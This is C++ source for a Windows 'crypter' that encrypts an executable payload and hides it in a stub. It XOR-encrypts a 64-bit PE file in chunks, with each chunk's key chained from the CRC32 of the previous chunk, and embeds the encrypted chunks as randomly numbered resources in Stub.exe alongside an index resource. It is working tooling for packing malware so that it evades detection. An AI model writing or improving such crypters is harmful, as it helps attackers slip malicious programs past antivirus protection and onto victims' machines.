#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include "stub_bytes.h"
#include <cstdint>
#include <algorithm>
#include <random>
#include <ctime>       // ← for time()
using namespace std;

// ============================================================================
// STRUCTURES
// ============================================================================
#pragma pack(push, 1)
struct PayloadIndex {
    uint32_t magic = 0xCAFEBABE;
    uint8_t  first_key;
    uint32_t total_size;
    uint16_t chunk_count;
    uint16_t first_chunk_id;
    uint32_t crc32;
};
#pragma pack(pop)

// ============================================================================
// GLOBAL
// ============================================================================
char* fileBuffer = nullptr;

// ============================================================================
// CRC32
// ============================================================================
uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

// ============================================================================
// CHAINED ENCRYPTION
// ============================================================================
std::vector<std::vector<char>> EncryptPayloadChained(const char* payload, long size, uint8_t first_key) {
    const int CHUNK_SIZE = 4096;
    int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    std::vector<std::vector<char>> encrypted_chunks(totalChunks);
    uint8_t current_key = first_key;

    for (int i = 0; i < totalChunks; i++) {
        int chunk_start = i * CHUNK_SIZE;
        int chunk_len = std::min(CHUNK_SIZE, (int)(size - chunk_start));
        std::vector<char> plain_chunk(payload + chunk_start, payload + chunk_start + chunk_len);
        auto& encrypted_chunk = encrypted_chunks[i];
        encrypted_chunk.resize(chunk_len);

        for (int j = 0; j < chunk_len; j++) {
            encrypted_chunk[j] = plain_chunk[j] ^ current_key;
        }

        cout << "[+] Chunk " << i << " encrypted with key 0x" << hex << (int)current_key << dec << endl;

        if (i < totalChunks - 1) {
            uint32_t crc = CalculateCRC32(plain_chunk.data(), plain_chunk.size());
            current_key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
        }
    }
    return encrypted_chunks;
}

// ============================================================================
// INJECT WITH MINIMAL SEPARATE INDEX
// ============================================================================
bool InjectWithSeparateIndex(const std::vector<std::vector<char>>& encrypted_chunks, long payloadSize, uint8_t first_key) {
    HANDLE hUpdate = BeginUpdateResourceA("Stub.exe", FALSE);
    if (!hUpdate) {
        cerr << "[-] BeginUpdateResource failed" << endl;
        return false;
    }

    int totalChunks = (int)encrypted_chunks.size();
    uint16_t first_chunk_id = 200 + (rand() % 500);  // random 200-699

    PayloadIndex index{};
    index.first_key = first_key;
    index.total_size = (uint32_t)payloadSize;
    index.chunk_count = (uint16_t)totalChunks;
    index.first_chunk_id = first_chunk_id;
    index.crc32 = CalculateCRC32(fileBuffer, payloadSize);

    // Inject index at ID 999
    if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(999),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        (LPVOID)&index, sizeof(index))) {
        cerr << "[-] Failed to inject index" << endl;
        EndUpdateResource(hUpdate, TRUE);
        return false;
    }

    // Inject chunks sequentially
    for (int i = 0; i < totalChunks; i++) {
        int id = first_chunk_id + i;
        const auto& chunk = encrypted_chunks[i];
        if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(id),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
            (LPVOID)chunk.data(), (DWORD)chunk.size())) {
            cerr << "[-] Failed to inject chunk ID " << id << endl;
            EndUpdateResource(hUpdate, TRUE);
            return false;
        }
        cout << "[+] Chunk " << i << " -> ID " << id << endl;
    }

    if (!EndUpdateResource(hUpdate, FALSE)) {
        cerr << "[-] EndUpdateResource failed" << endl;
        return false;
    }

    cout << "[+] Minimal index (ID 999) + sequential chunks from ID " << first_chunk_id << endl;
    return true;
}

// ============================================================================
// OLD FUNCTIONS (keep only what you need)
// ============================================================================
bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
    FILE* file = fopen(filename, "rb");
    if (!file) return false;
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    rewind(file);
    *buffer = (char*)malloc(*size);
    fread(*buffer, 1, *size, file);
    fclose(file);
    return true;
}

bool ValidatePEArchitecture(char* fileBuffer) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)fileBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(fileBuffer + dos->e_lfanew);
    return nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
}

bool WriteStubToFile() {
    ofstream file("Stub.exe", ios::binary);
    if (!file.write((char*)Stub_exe, Stub_exe_len)) return false;
    cout << "[+] Stub.exe written" << endl;
    return true;
}

void CleanupResources(char* fileBuffer) {
    if (fileBuffer) free(fileBuffer);
}

// ============================================================================
// MAIN
// ============================================================================
int main(int argc, char* argv[]) {
    srand((unsigned)time(nullptr));  // ← fixed for C++11+

    if (argc < 2) {
        cout << "Usage: crypter.exe <payload.exe>" << endl;
        system("pause");
        return 1;
    }

    const char* payloadFilename = argv[1];
    long fileSize = 0;
    const uint8_t FIRST_KEY = 0x5B;

    if (!ReadPayloadFile(payloadFilename, &fileBuffer, &fileSize)) return 1;
    if (!ValidatePEArchitecture(fileBuffer)) { CleanupResources(fileBuffer); return 1; }

    auto encrypted_chunks = EncryptPayloadChained(fileBuffer, fileSize, FIRST_KEY);

    if (!WriteStubToFile()) { CleanupResources(fileBuffer); return 1; }

    if (!InjectWithSeparateIndex(encrypted_chunks, fileSize, FIRST_KEY)) {
        CleanupResources(fileBuffer);
        return 1;
    }

    cout << "\n[SUCCESS] Crypter finished – minimal separate index + sequential chunks!\n" << endl;
    CleanupResources(fileBuffer);
    system("pause");
    return 0;
}